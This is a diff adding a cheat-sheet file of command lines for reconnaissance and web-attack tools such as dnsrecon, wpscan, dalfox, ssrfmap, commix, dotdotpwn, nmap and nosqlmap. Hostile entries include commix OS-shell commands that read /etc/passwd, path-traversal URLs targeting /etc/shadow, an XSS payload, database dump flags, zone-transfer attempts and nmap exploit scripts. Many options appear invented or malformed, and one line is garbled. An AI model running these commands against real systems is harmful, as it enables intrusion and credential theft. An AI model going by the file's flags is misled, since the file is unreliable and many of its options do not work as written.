@@ -1,0 +1,1141 @@
+assetfinder treadbinary.com
+assetfinder treadbinary.com | sort -u
+
+dnsrecon -d <domain> -t std
+dnsrecon -d <domain> -t axfr
+dnsrecon -d <domain> -t brt -D <wordlist>
+dnsrecon -d <domain> -t brt -D <wordlist> -n <nameserver>
+dnsrecon -d <domain> -t rev -r <cidr>
+dnsrecon -d <domain> -t srv
+dnsrecon -d <domain> -t dnssec
+dnsrecon -d <domain> -n <nameserver> -t std
+dnsrecon -d <domain> -n <nameserver> -t axfr
+dnsrecon -d <domain> -t brt -D <wordlist> -t rev
+dnsrecon -d <domain> -t std -t dnssec
+dnsrecon -d <domain> -t srv -n <nameserver>
+dnsrecon -d <domain> -t axfr -n <authoritative_nameserver>
+
+
+host <domain>
+host -t A <domain>
+host -t AAAA <domain>
+host -t MX <domain>
+host -t NS <domain>
+host -t TXT <domain>
+host -t SOA <domain>
+host -t SRV <service>.<protocol>.<domain>
+host -t PTR <ip>.in-addr.arpa
+host -a <domain>
+host -v <domain>
+host <domain> <nameserver>
+host -l <domain> <nameserver>
+host -t AXFR <domain> <nameserver>
+host -W 5 <domain>
+host -R 2 <domain>
+host -t ANY <domain>
+host -t CAA <domain>
+host -t NAPTR <domain>
+host -t DS <domain>
+host -t DNSKEY <domain>
+host -t TLSA _<port>._tcp.<domain>
+
+wpscan --url https://example.com
+wpscan --url https://example.com --enumerate p
+wpscan --url https://example.com --enumerate t
+wpscan --url https://example.com --enumerate u
+wpscan --url https://example.com --enumerate vp
+wpscan --url https://example.com --enumerate vt
+wpscan --url https://example.com --enumerate ap
+wpscan --url https://example.com --enumerate ap,vt,vp,p,t,u,cb,dbe
+wpscan --url https://example.com --enumerate cb
+wpscan --url https://example.com --enumerate dbe
+wpscan --url https://example.com --enumerate tt
+wpscan --url https://example.com --enumerate p --plugins-detection aggressive
+wpscan --url https://example.com --enumerate p --plugins-detection mixed
+wpscan --url https://example.com --enumerate u --usernames admin
+wpscan --url https://example.com --random-user-agent
+wpscan --url https://example.com --user-agent "Mozilla/5.0 (X11; Linux x86_64)"
+wpscan --url https://example.com --disable-tls-checks
+wpscan --url https://example.com --no-banner
+wpscan --url https://example.com --enumerate p --update
+wpscan --url https://example.com --enumerate u --max-threads 10
+wpscan --url https://example.com --enumerate p --plugins-version-detection
+wpscan --url https://example.com --enumerate p --plugins-version-detection --plugins-detection mixed
+
+
+wapiti -u https://example.com
+wapiti -u https://example.com --level 2
+wapiti -u https://example.com --depth 3
+wapiti -u https://example.com --crawl
+wapiti -u https://example.com --no-crawl
+wapiti -u https://example.com --cookies cookies.txt
+wapiti -u https://example.com --no-verify
+wapiti -u https://example.com --discover GET,POST
+wapiti -u https://example.com --exclude-url "/admin"
+wapiti -u https://example.com --timeout 30
+wapiti -u https://example.com --header "User-Agent: CustomAgent"
+wapiti -u https://example.com --scan-xss
+wapiti -u https://example.com --scan-sqli
+wapiti -u https://example.com --scan-crlf
+wapiti -u https://example.com --scan-xxe
+wapiti -u https://example.com --scan-robots
+wapiti -u https://example.com --scan-ssrf
+wapiti -u https://example.com --scan-file-inclusion
+wapiti -u https://example.com --output result.json
+wapiti -u https://example.com --output result.html
+wapiti -u https://example.com --format json
+wapiti -u https://example.com --report html
+wapiti -u https://example.com --verbosity 2
+wapiti -u https://example.com --no-redirect-follow
+wapiti -u https://example.com --no-check-robots
+wapiti -u https://example.com --no-check-cookie
+wapiti -u https://example.com --use-csrf-token
+wapiti -u https://example.com --exclude-extensions js,css
+
+
+xsstrike -u https://example.com
+xsstrike -u https://example.com --crawl
+xsstrike -u https://example.com --forms
+xsstrike -u https://example.com --data "param1=value1&param2=value2"
+xsstrike -u https://example.com --headers "User-Agent:CustomAgent;Referer:https://google.com"
+xsstrike -u https://example.com --cookie "SESSION=abcd1234"
+xsstrike -u https://example.com --payloads default
+xsstrike -u https://example.com --timeout 10
+xsstrike -u https://example.com --delay 2
+xsstrike -u https://example.com --random-agent
+xsstrike -u https://example.com --threads 10
+xsstrike -u https://example.com --blind
+xsstrike -u https://example.com --auto
+xsstrike -u https://example.com --fuzz
+xsstrike -u https://example.com --skip "logout,signout"
+xsstrike -u https://example.com --exclude-params "csrf,token"
+xsstrike -u https://example.com --verify-ssl False
+xsstrike -u https://example.com --no-color
+xsstrike -u https://example.com --forms --data "username=admin&password=pass" --cookie "SESSION=abcd"
+xsstrike -u https://example.com --crawl --delay 1 --threads 25
+
+dalfox scan --url https://example.com
+dalfox scan --url https://example.com --param q
+dalfox scan --url https://example.com --param id
+dalfox scan --url "https://example.com/search?q=test" 
+dalfox scan --url https://example.com --skip-static
+dalfox scan --url https://example.com --follow-redirect
+dalfox scan --url https://example.com --skip-crawl
+dalfox scan --url https://example.com --crawl
+dalfox scan --url https://example.com --depth 2
+dalfox scan --url https://example.com --timeout 10
+dalfox scan --url https://example.com --threads 10
+dalfox scan --url https://example.com --cookie "SESSION=abcd1234"
+dalfox scan --url https://example.com --header "User-Agent: Dalfox"
+dalfox scan --url https://example.com --header "Referer: https://example.com"
+dalfox scan --url https://example.com --blind-url https://callback.yourservice.com
+dalfox scan --url https://example.com --blind
+dalfox scan --url https://example.com --blind-collab
+dalfox scan --url https://example.com --skip-bav
+dalfox scan --url https://example.com --param-only
+dalfox single --url https://example.com?q=INJECTABLE
+dalfox single --url 'https://example.com?id=1' --payload '<script>alert(1)</script>'
+dalfox scan --url https://example.com --skip-waf
+dalfox scan --url https://example.com --agent "Mozilla/5.0 (X11; Linux x86_64)"
+dalfox scan --url https://example.com --ignore-params "csrf,token"
+dalfox scan --url https://example.com --exclude "/logout,/signout"
+dalfox scan --url https://example.com --level 3
+dalfox scan --url https://example.com --mutate
+dalfox scan --url https://example.com --burp
+dalfox scan --url https://example.com --verify-ssl false
+dalfox scan --url https://example.com --no-color
+
+
+xsser -u https://example.com
+xsser -u 'https://example.com?q=1'
+xsser --crawl -u https://example.com
+xsser --depth 3 -u https://example.com
+xsser --forms -u https://example.com
+xsser --data "param=value&other=val" -u https://example.com
+xsser --headers "User-Agent:Custom;Referer:https://example.com" -u https://example.com
+xsser --cookie "SESSION=abcd1234" -u https://example.com
+xsser --payloads default -u https://example.com
+xsser --fuzz -u https://example.com
+xsser --dom -u https://example.com
+xsser --blind -u https://example.com --callback https://oob.example.com
+xsser --timeout 10 -u https://example.com
+xsser --delay 2 -u https://example.com
+xsser --threads 10 -u https://example.com
+xsser --random-agent -u https://example.com
+xsser --follow-redirects -u https://example.com
+xsser --no-verify-ssl -u https://example.com
+xsser --exclude-params "csrf,token" -u https://example.com
+xsser --exclude-urls "/logout,/signout" -u https://example.com
+xsser --level 2 -u https://example.com
+xsser --batch -u https://example.com
+xsser -v -u https://example.com
+xsser -vv -u https://example.com
+xsser --single 'https://example.com?id=1'
+xsser --replay 'https://example.com' --data "id=INJECT"
+
+
+ssrfmap -u "http://example.com/page?url=TARGET" -p url
+ssrfmap -u "http://example.com/page" -p url -d "http://oob.example.com"
+ssrfmap -u "http://example.com/page?redirect=1" -p redirect --fuzz
+ssrfmap -u "http://example.com/page?u=TARGET" -p u --threads 10
+ssrfmap -u "http://example.com" -p url --tor
+ssrfmap -u "http://example.com" -p url --timeout 10
+ssrfmap -u "http://example.com" -p url --delay 2
+ssrfmap -u "http://example.com" -p url --ignore-ssl
+ssrfmap -u "http://example.com" -p url --no-redirect
+ssrfmap -u "http://example.com" -p url --follow-redirects
+ssrfmap -u "http://example.com" -p url --headers "User-Agent:CustomAgent;Referer:https://example.com"
+ssrfmap -u "http://example.com" -p url --cookie "SESSION=abcd1234"
+ssrfmap -u "http://example.com" -p url --auth "user:pass"
+ssrfmap -u "http://example.com" -p url --plugins all
+ssrfmap -u "http://example.com" -p url --plugins ssrfchecker
+ssrfmap -u "http://example.com" -p url --random-agent
+ssrfmap -u "http://example.com" -p url -v
+ssrfmap -u "http://example.com" -p url -vv
+ssrfmap -u "http://example.com" -p url --silent
+ssrfmap -u "http://example.com" -p url --exclude-params "csrf,token"
+ssrfmap -u "http://example.com" -p url --max-redirects 5
+ssrfmap -u "http://example.com" -p url --follow-scans
+ssrfmap -u "http://example.com" -p url --no-color
+ssrfmap -u "http://example.com" -p url --help-plugins
+
+
+golismero scan -t example.com
+golismero scan --targets example.com
+golismero scan -t example.com -v
+golismero scan -t example.com -vv
+golismero scan -t example.com --plugins all
+golismero scan -t example.com --plugins discovery
+golismero scan -t example.com --disable-plugins passive
+golismero scan -t example.com --enable-plugins active
+golismero scan -t example.com --plugin <plugin_name>
+golismero scan -t https://example.com --crawl
+golismero scan -t https://example.com --no-crawl
+golismero scan -t https://example.com --threads 10
+golismero scan -t https://example.com --timeout 30
+golismero scan -t https://example.com --user-agent "Mozilla/5.0"
+golismero scan -t https://example.com --cookie "SESSION=abcd"
+golismero scan -t https://example.com --exclude-paths "/logout,/admin"
+golismero scan -t https://example.com --include-paths "/api,/public"
+golismero scan -t example.com --dns
+golismero scan -t example.com --whois
+golismero scan -t example.com --port-scan
+golismero scan -t example.com --skip-port-scan
+golismero scan -t example.com --ssl
+golismero scan -t example.com --no-ssl
+golismero scan -t example.com --sitemap
+golismero scan -t example.com --max-depth 3
+golismero scan -t example.com --mutate
+golismero scan -t example.com --auth "user:pass"
+golismero scan -t example.com --verify-ssl false
+golismero scan -t example.com --random-agent
+golismero scan -t example.com --no-redirect
+golismero scan -t example.com --follow-redirects
+golismero scan -t example.com --header "Referer:https://example.com"
+golismero scan -t example.com --silent
+golismero scan -t example.com --debug
+golismero plugins --list
+golismero plugins --installed
+golismero plugins --available
+golismero plugin --info <plugin_name>
+golismero plugin --install <plugin_name>
+golismero plugin --remove <plugin_name>
+golismero plugin --enable <plugin_name>
+golismero plugin --disable <plugin_name>
+golismero update
+golismero db --init
+golismero db --reset
+golismero catalog --refresh
+golismero report --format json --stdout
+golismero report --format html --stdout
+golismero report --format xml --stdout
+golismero scan --resume <scan_id>
+golismero scan --stop <scan_id>
+golismero scan --list
+golismero scan --status <scan_id>
+
+
+corsy -u https://example.com
+corsy -u https://example.com --headers "User-Agent:CustomAgent"
+corsy -u https://example.com --check-all
+corsy -u https://example.com --check-methods
+corsy -u https://example.com --check-origin
+corsy -u https://example.com --check-credentials
+corsy -u https://example.com --check-allow-headers
+corsy -u https://example.com --check-allow-methods
+corsy -u https://example.com --check-allow-origin
+corsy -u https://example.com --check-expose-headers
+corsy -u https://example.com --check-max-age
+corsy -u https://example.com --check-vary
+corsy -u https://example.com --no-headers
+corsy -u https://example.com --follow-redirects
+corsy -u https://example.com --random-agent
+corsy -u https://example.com --timeout 10
+corsy -u https://example.com --cookie "SESSION=abcd1234"
+corsy -u https://example.com --user-agent "Mozilla/5.0 (X11; Linux x86_64)"
+corsy -u https://example.com --verbose
+corsy -u https://example.com --skip-ssl-check
+corsy -u https://example.com --max-redirects 5
+corsy -u https://example.com --threads 10
+corsy -u https://example.com --check-all --follow-redirects
+corsy -u https://example.com --check-methods --timeout 15
+corsy -u https://example.com --check-all --no-headers
+corsy -u https://example.com --check-origin --verbose
+
+
+testssl -u https://example.com
+testssl --check-ciphers https://example.com
+testssl --ssl2 https://example.com
+testssl --ssl3 https://example.com
+testssl --tls1 https://example.com
+testssl --tls1_1 https://example.com
+testssl --tls1_2 https://example.com
+testssl --tls1_3 https://example.com
+testssl --ecdh https://example.com
+testssl --ecc https://example.com
+testssl --open https://example.com
+testssl --suites https://example.com
+testssl --verbose https://example.com
+testssl --no-ccs https://example.com
+testssl --full https://example.com
+testssl --fast https://example.com
+testssl --session https://example.com
+testssl --strict https://example.com
+testssl --cipherlist https://example.com
+testssl --stapling https://example.com
+testssl --resumption https://example.com
+testssl --ocsp https://example.com
+testssl --tls13 https://example.com
+testssl --heartbleed https://example.com
+testssl --poodle https://example.com
+testssl --freak https://example.com
+testssl --no-color https://example.com
+testssl --max 10 https://example.com
+testssl --connect-timeout 10 https://example.com
+testssl --http https://example.com
+testssl --no-curl https://example.com
+testssl --suites default https://example.com
+testssl --ciphersuites ECDHE-ECDSA-AES256-GCM-SHA384 https://example.com
+testssl --insecure https://example.com
+testssl --show-all https://example.com
+testssl --bypass-check https://example.com
+testssl --self-signed https://example.com
+testssl --weak-ciphers https://example.com
+testssl --dh-params https://example.com
+testssl --ssl2-fallback https://example.com
+testssl --ssl2-client https://example.com
+testssl --no-verify-ssl https://example.com
+testssl --no-resume https://example.com
+testssl --cipher ECDHE-ECDSA-AES128-GCM-SHA256 https://example.com
+testssl --wildcard https://example.com
+
+sslyze example.com:443 --regular
+sslyze example.com:443 --certinfo=basic
+sslyze example.com:443 --certinfo=full
+sslyze example.com:443 --heartbleed
+sslyze example.com:443 --reneg
+sslyze example.com:443 --session-resumption
+sslyze example.com:443 --compression
+sslyze example.com:443 --http-get
+sslyze example.com:443 --http-head
+sslyze example.com:443 --tlsv1_0
+sslyze example.com:443 --tlsv1_1
+sslyze example.com:443 --tlsv1_2
+sslyze example.com:443 --tlsv1_3
+sslyze example.com:443 --sslv2
+sslyze example.com:443 --sslv3
+sslyze example.com:443 --cipher-suites
+sslyze example.com:443 --reneg-secure
+sslyze example.com:443 --ocsp
+sslyze example.com:443 --sni
+sslyze "93.184.216.34:443" --sni=example.com
+sslyze --starttls=smtp mail.example.com:25 --regular
+sslyze --starttls=imap mail.example.com:143 --regular
+sslyze --starttls=pop3 mail.example.com:110 --regular
+sslyze --starttls=ftp ftp.example.com:21 --regular
+sslyze --starttls=smtp mail.example.com:587 --certinfo=full
+sslyze --timeout=5 example.com:443 --regular
+sslyze --http-get="https://example.com/path" example.com:443 --tlsv1_3
+sslyze --json example.com:443
+sslyze --human-readable example.com:443
+sslyze --plugins=unknown_cipher example.com:443
+sslyze --openssl-cipher-suites ECDHE-RSA-AES128-GCM-SHA256 example.com:443
+sslyze --tls13-variants example.com:443
+sslyze --tls13-kex example.com:443
+sslyze --resumption example.com:443
+sslyze --alpn example.com:443
+sslyze --certificate-info example.com:443
+sslyze --batch example.com:443 --regular --certinfo=basic
+sslyze --no-http example.com:443
+
+
+commix -u "http://example.com/vuln.php?id=1"
+commix -u "http://example.com/vuln.php?id=1" --method POST --data "id=1"
+commix -u "http://example.com/vuln.php?id=1" --cookie "SESSION=abcd1234"
+commix -u "http://example.com/vuln.php?id=1" --user-agent "Mozilla/5.0"
+commix -u "http://example.com/vuln.php?id=1" --timeout 10
+commix -u "http://example.com/vuln.php?id=1" --random-agent
+commix -u "http://example.com/vuln.php?id=1" --crawl
+commix -u "http://example.com/vuln.php?id=1" --level 2
+commix -u "http://example.com/vuln.php?id=1" --batch
+commix -u "http://example.com/vuln.php?id=1" --verbosity 3
+commix -u "http://example.com/vuln.php?id=1" --post-data "id=1&name=admin"
+commix -u "http://example.com/vuln.php?id=1" --cookie "SESSION=abcd1234" --headers "Referer: http://example.com"
+commix -u "http://example.com/vuln.php?id=1" --no-color
+commix -u "http://example.com/vuln.php?id=1" --no-interaction
+commix -u "http://example.com/vuln.php?id=1" --inject-methods
+commix -u "http://example.com/vuln.php?id=1" --check-methods
+commix -u "http://example.com/vuln.php?id=1" --tamper-script /path/to/tamper.py
+commix -u "http://example.com/vuln.php?id=1" --os-shell
+commix -u "http://example.com/vuln.php?id=1" --os-shell --default-shell
+commix -u "http://example.com/vuln.php?id=1" --eval "id"
+commix -u "http://example.com/vuln.php?id=1" --user-agent "CustomAgent"
+commix -u "http://example.com/vuln.php?id=1" --rce
+commix -u "http://example.com/vuln.php?id=1" --eval "id;uname -a"
+commix -u "http://example.com/vuln.php?id=1" --os-shell --eval "uname -a"
+commix -u "http://example.com/vuln.php?id=1" --os-shell --eval "cat /etc/passwd"
+commix -u "http://example.com/vuln.php?id=1" --no-crawl --verbosity 2
+commix -u "http://example.com/vuln.php?id=1" --exploit
+commix -u "http://example.com/vuln.php?id=1" --post-data "id=1&name=test"
+commix -u "http://example.com/vuln.php?id=1" --skip-redirect
+commix -u "http://example.com/vuln.php?id=1" --threads 5
+commix -u "http://example.com/vuln.php?id=1" --check-all
+commix -u "http://example.com/vuln.php?id=1" --crawl --level 2 --threads 10
+commix -u "http://example.com/vuln.php?id=1" --no-interaction --skip-tests
+commix -u "http://example.com/vuln.php?id=1" --plugins
+commix -u "http://example.com/vuln.php?id=1" --help-plugins
+
+
+dotdotpwn -u "http://example.com/file.php?file=../../../etc/passwd"
+dotdotpwn -u "http://example.com/file.php?file=../../../../etc/passwd"
+dotdotpwn -u "http://example.com/file.php?file=../../../../../../etc/passwd"
+dotdotpwn -u "http://example.com/file.php?file=../../../var/www/html/index.php"
+dotdotpwn -u "http://example.com/file.php?file=../../../etc/shadow"
+dotdotpwn -u "http://example.com/file.php?file=../../../boot/grub/grub.cfg"
+dotdotpwn -u "http://example.com/file.php?file=../../../etc/apache2/sites-enabled/000-default.conf"
+dotdotpwn -u "http://example.com/file.php?file=../../../etc/mysql/my.cnf"
+dotdotpwn -u "http://example.com/file.php?file=../../../../../../../../etc/passwd" --level 2
+dotdotpwn -u "http://example.com/file.php?file=../../../etc/passwd" --skip-ssl
+dotdotpwn -u "http://example.com/file.php?file=../../../etc/passwd" --timeout 10
+dotdotpwn -u "http://example.com/file.php?file=../../../etc/passwd" --random-agent
+dotdotpwn -u "http://example.com/file.php?file=../../../etc/passwd" --no-color
+dotdotpwn -u "http://example.com/file.php?file=../../../etc/passwd" --threads 10
+dotdotpwn -u "http://example.com/file.php?file=../../../etc/passwd" --verbose
+dotdotpwn -u "http://example.com/file.php?file=../../../etc/passwd" --level 3
+dotdotpwn -u "http://example.com/file.php?file=../../../etc/passwd" --no-crawl
+dotdotpwn -u "http://example.com/file.php?file=../../../etc/passwd" --crawl
+dotdotpwn -u "http://example.com/file.php?file=../../../etc/passwd" --depth 3
+dotdotpwn -u "http://example.com/file.php?file=../../../etc/passwd" --header "User-Agent:CustomAgent"
+dotdotpwn -u "http://example.com/file.php?file=../../../etc/passwd" --cookie "SESSION=abcd1234"
+dotdotpwn -u "http://example.com/file.php?file=../../../etc/passwd" --auth "admin:password"
+dotdotpwn -u "http://example.com/file.php?file=../../../etc/passwd" --skip-tests
+dotdotpwn -u "http://example.com/file.php?file=../../../etc/passwd" --exclude-paths "/admin,/login"
+dotdotpwn -u "http://example.com/file.php?file=../../../etc/passwd" --exclude-params "csrf,token"
+
+
+dig @<nameserver> <domain>
+dig <domain>
+dig +short <domain>
+dig +nocmd <domain>
+dig +noall +answer <domain>
+dig +noall +ttlid +answer <domain>
+dig +multiline <domain> ANY
+dig <domain> ANY
+dig -t A <domain>
+dig -t AAAA <domain>
+dig -t MX <domain>
+dig -t NS <domain>
+dig -t TXT <domain>
+dig -t SOA <domain>
+dig -t SRV _<service>._<proto>.<domain>
+dig -t PTR <reversed-ip>.in-addr.arpa
+dig -t PTR <reversed-ip>.ip6.arpa
+dig -t CNAME <domain>
+dig -t DS <domain>
+dig -t DNSKEY <domain>
+dig -t TLSA _<port>._tcp.<domain>
+dig -t AXFR <domain> @<nameserver>
+dig @<nameserver> <domain> +trace
+dig +trace <domain>
+dig +nssearch <domain>
+dig +dnssec <domain>
+dig +sigchase <domain> @<trust-anchor-server>   # if supported in build
+dig +rrcomments <domain>
+dig +cmd <domain>
+dig +stats <domain>
+dig +time=5 <domain>
+dig +tries=1 <domain>
+dig +tcp <domain>
+dig -p 5353 @<nameserver> <domain>
+dig +vc <domain>
+dig +norecurse <domain>
+dig +noedns <domain>
+dig +bufsize=4096 <domain>
+dig +edns=0 <domain>
+dig -4 <domain>
+dig -6 <domain>
+dig +short -x <ip>
+dig +short @<nameserver> <domain> A
+dig @<nameserver> <domain> CH TXT
+dig -c IN -t A <domain>
+dig -k /path/to/keyfile <domain>   # DNSSEC keyfile usage (if build supports -k)
+dig -y <keyname>:<secret> @<server> <domain>   # TSIG signed query
+dig -f <file_with_queries>   # send multiple queries from file
+dig +noauth <domain>
+dig +question <domain>
+dig +noquestion +nocomments <domain>
+dig @<server> <domain> +answer +authority +additional
+dig +short TXT <domain>
+dig +short MX <domain>
+dig +short NS <domain>
+dig +dnssec +multi <domain>
+dig <domain> @<server> -p 53 +tcp +time=3 +tries=2
+
+dnsenum example.com
+dnsenum --enum example.com
+dnsenum --dnsserver 8.8.8.8 example.com
+dnsenum --subnet example.com
+dnsenum --snoop example.com
+dnsenum --dnsserver 8.8.8.8 --enum example.com
+dnsenum --enum --threads 10 example.com
+dnsenum --enum --silent example.com
+dnsenum --enum --nocolor example.com
+dnsenum --enum --no-reverse example.com
+dnsenum --enum --no-scan example.com
+dnsenum --enum --no-cname example.com
+dnsenum --enum --no-scan-aaaa example.com
+dnsenum --enum --no-scan-mx example.com
+dnsenum --enum --no-scan-ns example.com
+dnsenum --enum --no-scan-soa example.com
+dnsenum --enum --no-scan-tlsa example.com
+dnsenum --enum --no-scan-sshfp example.com
+dnsenum --enum --dnssec example.com
+dnsenum --enum --search example.com
+dnsenum --enum --find-subdomains example.com
+dnsenum --enum --dns-scan --subnet 192.168.1.0/24
+dnsenum --enum --detection example.com
+dnsenum --enum --zone-transfer example.com
+dnsenum --enum --brute-force example.com
+dnsenum --enum --target 192.168.0.1
+dnsenum --enum --ip 192.168.0.1 example.com
+dnsenum --enum --reverse example.com
+dnsenum --enum --update example.com
+dnsenum --enum --recurse example.com
+dnsenum --enum --tcp-connection example.com
+dnsenum --enum --skip-nxexample.com
+dnsenum --enum --skip-cname example.com
+dnsenum --enum --resolve-all example.com
+dnsenum --enum --ignore-soa example.com
+dnsenum --enum --verbose example.com
+dnsenum --enum --debug example.com
+dnsenum --enum --no-answers example.com
+dnsenum --enum --max-tries 5 example.com
+dnsenum --enum --no-bypass example.com
+
+
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt
+ffuf -u http://example.com/FUZZ -w /path/to/wordlist.txt -t 50
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -e .php,.html,.bak
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -mc 200,301,302
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -fc 404,403
+ffuf -u https://example.com/page.php?file=FUZZ -w /path/to/wordlist.txt
+ffuf -u "https://example.com/search?q=FUZZ" -w /path/to/wordlist.txt
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -H "User-Agent: Mozilla/5.0"
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -H "Host: FUZZ.example.com"
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -b "SESSION=abcd1234"
+ffuf -u https://example.com/login -w /path/to/wordlist.txt -X POST -d "username=admin&password=FUZZ"
+ffuf -u https://example.com/api -w /path/to/wordlist.txt -X PUT -d "data=FUZZ"
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -x http://127.0.0.1:8080
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -x socks5://127.0.0.1:9050
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -t 100 -c
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -mr "Welcome" 
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -ml 123
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -mw 42
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -ms 512
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -recursion -recursion-depth 2
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -sa
+ffuf -u "http://example.com/FUZZ?file=BAR" -w /path/words1.txt:FUZZ,/path/words2.txt:BAR
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -i
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -p 0.5
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -recursion -recursion-strategy breadth
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -tls-cert /path/to/cert.pem -tls-key /path/to/key.pem
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -r
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -timeout 10
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -fs 0
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -ac
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -v
+ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -od /dev/null
+
+
+findomain -t example.com
+findomain --target example.com
+findomain -t example.com -q
+findomain -t example.com -v
+findomain -t example.com --ip
+findomain -t example.com --asn
+findomain -t example.com --subs
+findomain -t example.com --all
+findomain -t example.com --threads 10
+findomain -t example.com --brute
+findomain -t example.com --source crtsh
+findomain -t example.com --source certspotter
+findomain -t example.com --source threatcrowd
+findomain -t example.com --source alienvault
+findomain -t example.com --source sublist3r
+findomain -t example.com --active
+findomain -t example.com --passive
+findomain -t example.com --wildcard
+findomain -t example.com --filter-ip 93.184.216.34
+findomain -t example.com --unique
+findomain -t example.com --no-color
+findomain -t example.com --no-repeat
+findomain -t example.com --include-sources crtsh,certspotter
+findomain -t example.com --exclude-sources sublist3r
+findomain -t example.com --print-resolvers
+findomain -u
+findomain --update
+findomain -t example.com --export-json
+findomain -t example.com --export-csv
+
+nmap 192.168.1.1
+nmap -sL 192.168.1.0/24
+nmap -sn 192.168.1.0/24
+nmap -Pn 192.168.1.1
+sudo nmap -sS 192.168.1.1
+nmap -sT 192.168.1.1
+sudo nmap -sU 192.168.1.1
+nmap -sS -sU 192.168.1.1
+nmap -sA 192.168.1.1
+nmap -sN 192.168.1.1
+nmap -sF 192.168.1.1
+nmap -sX 192.168.1.1
+nmap -sY 192.168.1.1
+nmap -sZ 192.168.1.1
+nmap -sV 192.168.1.1
+nmap -O 192.168.1.1
+nmap -A 192.168.1.1
+nmap --script default 192.168.1.1
+nmap --script vuln 192.168.1.1
+nmap --script "http-*" 192.168.1.1
+nmap --script "auth,brute,discovery" 192.168.1.1
+nmap --script "safe and (default or discovery)" 192.168.1.1
+nmap -p 1-65535 192.168.1.1
+nmap -p 22,80,443 192.168.1.1
+nmap -p U:53,T:22-25,80 192.168.1.1
+nmap --top-ports 100 192.168.1.1
+nmap --min-rate 1000 192.168.1.0/24
+nmap -T4 192.168.1.1
+nmap -T5 192.168.1.1
+sudo nmap -sS -T4 -Pn 192.168.1.1
+nmap -6 -sV -p 443 2001:db8::1
+nmap -sV --version-intensity 2 192.168.1.1
+nmap -sV --version-all 192.168.1.1
+nmap -sV --version-light 192.168.1.1
+nmap -A -v 192.168.1.1
+nmap -v -v 192.168.1.1
+nmap -oG - -v 192.168.1.0/24
+nmap -oX - 192.168.1.1
+nmap --packet-trace 192.168.1.1
+nmap --reason 192.168.1.1
+nmap --open 192.168.1.0/24
+nmap --script-updatedb
+nmap --script-trace --script "http-enum" 192.168.1.1
+nmap --script "brute,exploit" 192.168.1.1
+nmap --script "auth and default" 192.168.1.1
+nmap --script-args user=admin,pass=admin 192.168.1.1
+nmap --script-args=unsafe=1 192.168.1.1
+nmap --datadir /usr/share/nmap 192.168.1.1
+nmap --send-ip 192.168.1.1
+nmap -S 1.2.3.4 192.168.1.1
+nmap -e eth0 192.168.1.1
+nmap --source-port 53 192.168.1.1
+nmap -f 192.168.1.1
+nmap --mtu 24 192.168.1.1
+nmap --badsum 192.168.1.1
+nmap --data-length 50 192.168.1.1
+nmap --ttl 64 192.168.1.1
+nmap --traceroute 192.168.1.1
+sudo nmap -sS --script "http-vuln-cve*" 192.168.1.1
+nmap -sP 192.168.1.0/24
+nmap --reason --packet-trace -A 192.168.1.1
+nmap -oA - 192.168.1.1
+nmap -p- --min-rate 1000 192.168.1.1
+nmap --exclude 192.168.1.5,192.168.1.6 192.168.1.0/24
+nmap --iflist
+nmap --resume scanfile  # resume a previous Nmap scan (if supported)
+nmap --stylesheet my.xsl 192.168.1.1
+nmap --append-output 192.168.1.1
+nmap -oN - 192.168.1.1
+nmap -sU -p 53 --script=dns-recursion 192.168.1.1
+nmap --script ssl-cert,ssl-enum-ciphers -p 443 192.168.1.1
+nmap --script smb-enum-shares,smb-os-discovery -p 445 192.168.1.1
+nmap --script ftp-anon -p 21 192.168.1.1
+nmap --script http-sql-injection -p 80,443 example.com
+nmap --script dns-zone-transfer -p 53 example.com
+nmap --script whois-domain --script-args whois-lookup=1 example.com
+
+
+nosqlmap -u "http://example.com/api" 
+nosqlmap -u "http://example.com/api" --data "search=abc"
+nosqlmap -u "http://example.com/api" --cookie "SESSION=abcd1234"
+nosqlmap -u "http://example.com/api" --headers "User-Agent:CustomAgent;Referer:https://example.com"
+nosqlmap -u "http://example.com/api" --dbs
+nosqlmap -u "http://example.com/api" --collections
+nosqlmap -u "http://example.com/api" --tables
+nosqlmap -u "http://example.com/api" --dump
+nosqlmap -u "http://example.com/api" --dump-all
+nosqlmap -u "http://example.com/api" --dump --collection users
+nosqlmap -u "http://example.com/api" --query '{"username":"admin"}'
+nosqlmap -u "http://example.com/api" --all
+nosqlmap -u "http://example.com/api" --fingerprint
+nosqlmap -u "http://example.com/api" --technique bson
+nosqlmap -u "http://example.com/api" --technique json
+nosqlmap -u "http://example.com/api" --technique rest
+nosqlmap -u "http://example.com/api" --threads 10
+nosqlmap -u "http://example.com/api" --random-agent
+nosqlmap -u "http://example.com/api" --tor
+nosqlmap -u "http://example.com/api" --timeout 10
+nosqlmap -u "http://example.com/api" --delay 1
+nosqlmap -u "http://example.com/api" --time-sec 5
+nosqlmap -u "http://example.com/api" --level 3
+nosqlmap -u "http://example.com/api" --risk 2
+nosqlmap -u "http://example.com/api" --batch
+nosqlmap -u "http://example.com/api" --verbose
+nosqlmap -u "http://example.com/api" --no-cast
+nosqlmap -u "http://example.com/api" --smart
+nosqlmap -u "http://example.com/api" --auth-type basic --username admin --password secret
